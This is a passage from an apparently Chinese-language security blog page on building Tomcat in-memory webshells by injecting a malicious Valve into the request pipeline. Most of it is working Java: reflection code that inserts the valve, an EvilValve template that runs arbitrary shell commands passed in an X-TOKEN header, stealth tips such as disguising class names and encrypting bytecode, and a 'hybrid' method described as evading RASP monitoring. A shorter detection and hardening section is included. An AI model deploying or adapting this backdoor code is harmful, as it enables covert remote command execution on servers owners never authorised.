</div></div>
</div><h4 id="步骤5实例化并注入valve"><strong>步骤5：实例化并注入Valve</strong><a hidden class="anchor" aria-hidden="true" href="#步骤5实例化并注入valve">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8">8</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="err">实例化恶意</span><span class="n">Valve</span>
</span></span><span class="line"><span class="cl"><span class="n">Constructor</span><span class="o">&lt;</span><span class="err">?</span><span class="o">&gt;</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">evilValveClass</span><span class="o">.</span><span class="n">getDeclaredConstructor</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="n">constructor</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="ne">Object</span> <span class="n">evilValve</span> <span class="o">=</span> <span class="n">constructor</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="err">获取</span><span class="n">Pipeline的addValve方法</span>
</span></span><span class="line"><span class="cl"><span class="n">Method</span> <span class="n">addValveMethod</span> <span class="o">=</span> <span class="n">pipeline</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;addValve&#34;</span><span class="p">,</span> <span class="n">Valve</span><span class="o">.</span><span class="k">class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">addValveMethod</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">pipeline</span><span class="p">,</span> <span class="n">evilValve</span><span class="p">);</span> <span class="o">//</span> <span class="err">注入到管道末尾</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="步骤6可选控制注入位置"><strong>步骤6（可选）：控制注入位置</strong><a hidden class="anchor" aria-hidden="true" href="#步骤6可选控制注入位置">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 获取Pipeline的valves数组
</span></span><span class="line"><span class="cl">Field valvesField = pipeline.getClass().getDeclaredField(&#34;valves&#34;);
</span></span><span class="line"><span class="cl">valvesField.setAccessible(true);
</span></span><span class="line"><span class="cl">Valve[] valves = (Valve[]) valvesField.get(pipeline);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 创建新数组并将恶意Valve插入第二位（紧接AccessLogValve后）
</span></span><span class="line"><span class="cl">Valve[] newValves = new Valve[valves.length + 1];
</span></span><span class="line"><span class="cl">System.arraycopy(valves, 0, newValves, 0, 1);    // 保留第一个Valve
</span></span><span class="line"><span class="cl">newValves[1] = (Valve) evilValve;                // 恶意Valve插入第二位
</span></span><span class="line"><span class="cl">System.arraycopy(valves, 1, newValves, 2, valves.length - 1);
</span></span><span class="line"><span class="cl">valvesField.set(pipeline, newValves);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li><strong>位置策略</strong>：插入在<code>StandardContextValve</code>之前（通常索引1）确保捕获所有请求。</li>
</ul>
<h3 id="三恶意valve类实现模板"><strong>三、恶意Valve类实现模板</strong><a hidden class="anchor" aria-hidden="true" href="#三恶意valve类实现模板">#</a></h3>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public class EvilValve implements Valve {
</span></span><span class="line"><span class="cl">    private static final String password = &#34;X-TOKEN&#34;; // 激活密码
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Override
</span></span><span class="line"><span class="cl">    public void invoke(Request request, Response response) throws IOException, ServletException {
</span></span><span class="line"><span class="cl">        // 1. 检查激活密码
</span></span><span class="line"><span class="cl">        String cmd = request.getHeader(password);
</span></span><span class="line"><span class="cl">        if (cmd == null) {
</span></span><span class="line"><span class="cl">            getNext().invoke(request, response); // 传递请求
</span></span><span class="line"><span class="cl">            return;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        // 2. 执行命令并回显
</span></span><span class="line"><span class="cl">        try {
</span></span><span class="line"><span class="cl">            String[] cmds = System.getProperty(&#34;os.name&#34;).contains(&#34;win&#34;) 
</span></span><span class="line"><span class="cl">                ? new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, cmd} 
</span></span><span class="line"><span class="cl">                : new String[]{&#34;/bin/sh&#34;, &#34;-c&#34;, cmd};
</span></span><span class="line"><span class="cl">            Process p = Runtime.getRuntime().exec(cmds);
</span></span><span class="line"><span class="cl">            InputStream in = p.getInputStream();
</span></span><span class="line"><span class="cl">            // ... 读取输出并写入response ...
</span></span><span class="line"><span class="cl">        } catch (Exception e) {
</span></span><span class="line"><span class="cl">            response.getWriter().write(&#34;ERROR: &#34; + e.getMessage());
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    // 其他Valve接口方法（空实现）
</span></span><span class="line"><span class="cl">    @Override public String getInfo() { return null; }
</span></span><span class="line"><span class="cl">    @Override public Valve getNext() { return null; }
</span></span><span class="line"><span class="cl">    @Override public void setNext(Valve valve) {}
</span></span><span class="line"><span class="cl">    @Override public void backgroundProcess() {}
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="四技术难点与规避方案"><strong>四、技术难点与规避方案</strong><a hidden class="anchor" aria-hidden="true" href="#四技术难点与规避方案">#</a></h3>
<ol>
<li>
<p><strong>ClassLoader穿透问题</strong></p>
<ul>
<li>
<p>场景：在<code>BootstrapClassLoader</code>中执行（如反序列化漏洞）</p>
</li>
<li>
<p>方案：通过线程上下文类加载器传递</p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Thread.currentThread().setContextClassLoader(webappClassLoader);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
</ul>
</li>
<li>
<p><strong>Tomcat版本兼容性</strong></p>
<ul>
<li>
<p><code>StandardRoot</code>路径变化（Tomcat 8.0+）：</p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// Tomcat 8.5+ 获取StandardContext
</span></span><span class="line"><span class="cl">Object resources = webappClassLoader.getResources();
</span></span><span class="line"><span class="cl">Method getContextMethod = resources.getClass().getMethod(&#34;getContext&#34;);
</span></span><span class="line"><span class="cl">Object standardContext = getContextMethod.invoke(resources);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
</ul>
</li>
<li>
<p><strong>内存马隐身技巧</strong></p>
<ul>
<li>类名伪装：<code>com.sun.tools.javac.util.Context</code>（仿JDK类）</li>
<li>字节码加密：运行时解密后再defineClass</li>
<li>惰性加载：首次匹配密码时才初始化命令执行逻辑</li>
</ul>
</li>
</ol>
<h3 id="五检测与防御手段"><strong>五、检测与防御手段</strong><a hidden class="anchor" aria-hidden="true" href="#五检测与防御手段">#</a></h3>
<h4 id="检测方案"><strong>检测方案</strong><a hidden class="anchor" aria-hidden="true" href="#检测方案">#</a></h4>
<ol>
<li>
<p><strong>Heap Dump分析</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT * FROM java.lang.Object 
</span></span><span class="line"><span class="cl">WHERE toString() LIKE &#34;%StandardContextValve%&#34; 
</span></span><span class="line"><span class="cl">AND dominators() INCLUDES $.valves</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>定位<code>StandardPipeline.valves</code>数组中异常Valve</li>
</ul>
</li>
<li>
<p><strong>RASP监控点</strong></p>
<ul>
<li>拦截<code>ClassLoader.defineClass()</code>调用</li>
<li>监控<code>StandardPipeline.addValve()</code>反射调用栈</li>
<li>检测非初始化阶段新增的Valve</li>
</ul>
</li>
<li>
<p><strong>行为特征检测</strong></p>
<ul>
<li>请求头包含<code>X-TOKEN</code>等固定标记</li>
<li>无关联页面的HTTP请求返回命令输出</li>
</ul>
</li>
</ol>
<h4 id="防御措施"><strong>防御措施</strong><a hidden class="anchor" aria-hidden="true" href="#防御措施">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- 禁用Context的管道修改 (context.xml) --&gt;
</span></span><span class="line"><span class="cl">&lt;Context allowPipelineModification=&#34;false&#34;&gt;</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ol>
<li>
<p><strong>策略限制</strong></p>
<ul>
<li>禁止反射调用<code>defineClass()</code>（SecurityManager）</li>
<li>锁定<code>StandardPipeline.valves</code>数组写权限</li>
</ul>
</li>
<li>
<p><strong>运行时加固</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-javaagent:rasp_agent.jar=block_unauth_valve</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
</ol>
<h2 id="混合方式利用-tomcat-api--反射">混合方式（利用 Tomcat API &amp; 反射）<a hidden class="anchor" aria-hidden="true" href="#混合方式利用-tomcat-api--反射">#</a></h2>
<h3 id="一混合注入的核心优势">一、混合注入的核心优势<a hidden class="anchor" aria-hidden="true" href="#一混合注入的核心优势">#</a></h3>
<ol>
<li><strong>效率与稳定性的平衡</strong>：
<ul>
<li>使用Tomcat API直接调用核心方法，减少反射操作</li>
<li>对关键路径使用反射突破访问限制</li>
<li>比纯反射方式更稳定，减少版本兼容问题</li>
</ul>
</li>
<li><strong>降低检测风险</strong>：
<ul>
<li>减少反射调用次数，避免触发RASP的反射监控</li>
<li>直接API调用混入正常业务逻辑中更隐蔽</li>
</ul>
</li>
<li><strong>开发便利性</strong>：
<ul>
<li>代码可读性更高</li>
<li>调试和维护更简单</li>
</ul>
</li>
</ol>
<h3 id="二混合注入详细流程">二、混合注入详细流程<a hidden class="anchor" aria-hidden="true" href="#二混合注入详细流程">#</a></h3>
<h3 id="前置条件">前置条件<a hidden class="anchor" aria-hidden="true" href="#前置条件">#</a></h3>
<ul>
<li>已获得执行环境（如通过JSP WebShell或反序列化漏洞）</li>
<li>Tomcat API库（catalina.jar）在类路径中可用</li>
<li>当前ClassLoader是WebappClassLoader</li>
</ul>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 获取当前Web应用的ClassLoader
</span></span><span class="line"><span class="cl">WebappClassLoader classLoader = 
</span></span><span class="line"><span class="cl">    (WebappClassLoader) Thread.currentThread().getContextClassLoader();</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>步骤1：获取StandardContext对象（混合方式）</strong></p>
<h4 id="方法a通过servletcontext推荐">方法A：通过ServletContext（推荐）<a hidden class="anchor" aria-hidden="true" href="#方法a通过servletcontext推荐">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 在JSP/Servlet环境中可直接获取request
</span></span><span class="line"><span class="cl">ServletRequest request = ...; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 获取ServletContext
</span></span><span class="line"><span class="cl">ServletContext servletContext = request.getServletContext();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 反射获取ApplicationContext
</span></span><span class="line"><span class="cl">Field appCtxField = servletContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">appCtxField.setAccessible(true);
</span></span><span class="line"><span class="cl">ApplicationContext appCtx = (ApplicationContext) appCtxField.get(servletContext);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 反射获取StandardContext
</span></span><span class="line"><span class="cl">Field stdCtxField = appCtx.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">stdCtxField.setAccessible(true);
</span></span><span class="line"><span class="cl">StandardContext standardContext = (StandardContext) stdCtxField.get(appCtx);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="方法b通过classloader无request时">方法B：通过ClassLoader（无request时）<a hidden class="anchor" aria-hidden="true" href="#方法b通过classloader无request时">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
